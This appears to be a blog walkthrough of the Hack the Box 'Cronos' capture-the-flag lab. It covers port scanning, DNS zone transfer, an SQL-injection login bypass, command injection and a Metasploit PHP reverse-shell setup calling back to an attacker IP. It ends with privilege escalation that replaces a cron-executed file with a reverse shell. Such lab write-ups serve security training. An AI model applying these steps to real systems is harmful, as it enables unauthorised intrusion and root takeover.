@@ -1,0 +1,255 @@
+
+								
+																		Hack the Box Challenge: Cronos Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on March 27, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF challenge “Cronos” which is available online for those who want to increase their skill in penetration testing. Cronos is retried vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level, they have a collection of vulnerable labs as challenges from beginners to Expert level. We are going to start a new series of hack the box beginning with Cronos craft which is designed for beginners.
+Level: Intermediate
+Task: find user.txt and root.txt file in the victim’s machine.
+Since these labs are online available therefore they have static IP and IP of sense is 10.10.10.13 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.13
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.13
+					
+				
+			
+		
+
+From the given below image, you can observe we found port 22,53,80 are open in the victim’s network.
+
+Knowing port 80 is open in the victim’s network we preferred to explore this IP in a browser but didn’t get any remarkable clue for next step. It just came out that the Apache HTTP Server is working properly.
+
+Now we have added the domain name of the target machine in the /etc/hosts file to access the webpage using the IP address as well as Domain Name that we have added.
+
+Knowing that Port 53 is open. We have used command host -l cronos.htb 10.10.10.13 to check the DNS running on this IP. On the other hand, it gave us a clue for our next step which is another Domain Name i.e admin.cronos.htb
+
+Now we have added the new domain name which was found in the previous step inside /etc/hosts file to access this webpage with both IP address and Domain Name.
+
+Now open https://admin.cronos.htb on the browser. And it came out to be a Login Portal asking for username and password credentials to log us in. Basically, we know in a situation like this, we might generally use Brute Forcing or SQL Injection. After long hours of trying we finally breached it using SQL injection command in the Username and giving any Random Number in the Password.
+
+From the previous step, we are successfully logged into this portal. And the page opened is given below.
+
+Now in this critical situation, we thought of running command injection; ls as shown below. Which showed us some .php files.
+
+We have used Metasploit exploit /multi/script/web_delivery and got the meterpreter as you can see below.
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/script/web_delivery
+msf exploit(multi/script/web_delivery) set target 1
+msf exploit(multi/script/web_delivery) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/script/web_delivery) set lhost 10.10.14.3
+msf exploit(multi/script/web_delivery) set lport 8082
+msf exploit(multi/script/web_delivery) exploit
+			
+				
+					
+				
+					123456
+				
+						msf use exploit/multi/script/web_deliverymsf exploit(multi/script/web_delivery) set target 1msf exploit(multi/script/web_delivery) set payload php/meterpreter/reverse_tcpmsf exploit(multi/script/web_delivery) set lhost 10.10.14.3msf exploit(multi/script/web_delivery) set lport 8082msf exploit(multi/script/web_delivery) exploit
+					
+				
+			
+		
+
+
+Next, you can we have pasted the copied command and clicked on execute.
+
+ 
+There we got our first Session along with the meterpreter. Once we have got the meterpreter. We have used command cd /home to check what kind of directories are on home. Then we check inside the noulis directory using command ls /home/noulis, here we found out the user.txt file and used cat user.txt to read the file content which contains our first FLAG!!
+
+		
+		
+			
+			
+			
+			
+sessions 1
+sysinfo
+cd /home
+ls
+cd noulis
+ls
+cat user.txt
+			
+				
+					
+				
+					1234567
+				
+						sessions 1sysinfocd /homelscd noulislscat user.txt
+					
+				
+			
+		
+
+
+After we have used command cat crontab to view the contents inside the crontab. Hereby viewing the logs of crontab we saw a PHP file which has been scheduled and gets executed every time.
+
+So we thought of downloading this file to our Desktop by using the command
+
+		
+		
+			
+			
+			
+			
+download /var/www/laravel/artisan /root/Desktop/ .
+			
+				
+					
+				
+					1
+				
+						download /var/www/laravel/artisan /root/Desktop/ .
+					
+				
+			
+		
+
+
+Now we have used a default web shell named php-reverse-shell.php and by editing this file using the text editor. We have changed the IP to our local host IP and changed the port to 1234. Click on Save. And we have also changed the name of this file to artisan which was the name of the file we downloaded earlier.
+
+It’s time to upload this file artisan.php to the same location from where we downloaded the original artisan file. For this the command used is 
+
+		
+		
+			
+			
+			
+			
+upload /root/Desktop/artisan.php /var/www/laravel/artisan
+			
+				
+					
+				
+					1
+				
+						upload /root/Desktop/artisan.php /var/www/laravel/artisan
+					
+				
+			
+		
+
+
+Next, we have started a netcat listener using command nc –lvp 1234. Therefore as per crontab, the scheduled artisan.php can be executed whenever its turn will come up. After a few minutes this file got executed, then we used command ls to look a directory named root. The command used is cat /root for the contents in the root directory. We found the root.txt file. By using command cat /root.txt. We found out final Flag!!
+
+Author: Ashray Gupta is a Researcher and Technical Writer at Hacking Articles. He is a certified ethical hacker, web penetration tester and a researcher in nanotechnology. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								Bob December 28, 2018 at 12:09 am							
+							
+							
+														
+							
+								Excellent alternative to the official writeup. Thanks mate !
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
